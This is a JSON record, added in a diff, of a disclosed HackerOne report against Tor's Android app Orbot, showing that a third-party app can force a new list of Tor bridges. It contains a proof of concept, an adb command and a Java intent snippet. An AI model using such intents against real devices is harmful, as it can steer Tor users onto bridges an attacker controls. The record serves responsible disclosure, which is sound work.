@@ -1,0 +1,135 @@
+{
+  "id": 252626,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTI2MjY=",
+  "url": "https://hackerone.com/reports/252626",
+  "title": "[Android org.torproject.android] Possible to force list of bridges",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2017-07-22T20:32:06.453Z",
+  "submitted_at": "2017-07-22T20:32:06.453Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bagipro",
+    "url": "/bagipro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1800,
+    "url": "https://hackerone.com/torproject",
+    "handle": "torproject",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Tor",
+      "twitter_handle": "torproject",
+      "website": "https://www.torproject.org/",
+      "about": "Anonymity Online"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-08-21T19:11:41.303Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-07-24T17:40:06.439Z",
+  "team_member_agreed_on_going_public_at": "2017-08-21T19:11:41.265Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Do the following thing from ADB to emulate the activity start:\n```\nadb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx\n```\n\nOr create a malware app with the following code:\n```java\n        Intent intent = new Intent(\"android.intent.action.VIEW\");\n        intent.setClassName(\"org.torproject.android\", \"org.torproject.android.OrbotMainActivity\");\n        intent.setData(Uri.parse(\"bridge://xxx\"));\n        startActivity(intent);\n```\n\nAnd new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).\n\nIt's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).",
+  "weakness": {
+    "id": 85,
+    "name": "Forced Browsing"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 205671,
+      "file_name": "Screenshot_2017-07-22-21-29-11.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/205/671/dbf1822274f5b31e8b0550d0b10b9691db403346/Screenshot_2017-07-22-21-29-11.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2017-07-22-21-29-11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2017-07-22-21-29-11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152540Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3d6116bcafaa63454a1f343840bd84d5c2b3d1506bbd46f11f34be8491c6dc2d",
+      "file_size": 113024,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 205672,
+      "file_name": "Screenshot_2017-07-22-21-28-58.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/205/672/d46cfa401201fbbfcd6ec3b16b891ba580b66b28/Screenshot_2017-07-22-21-28-58.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2017-07-22-21-28-58.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2017-07-22-21-28-58.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152540Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3deb2345d8c1862812fdd7252ac69146dca2fc7ab339dc1b567ba5ce35485d4e",
+      "file_size": 344996,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 13,
+  "voters": [
+    "jensec",
+    "sheikhrishad0",
+    "cuso4",
+    "muhammad_uwais",
+    "iamurstkj",
+    "babusec",
+    "petec0x0",
+    "secr8",
+    "destinedtohack",
+    "binaryhunter007",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
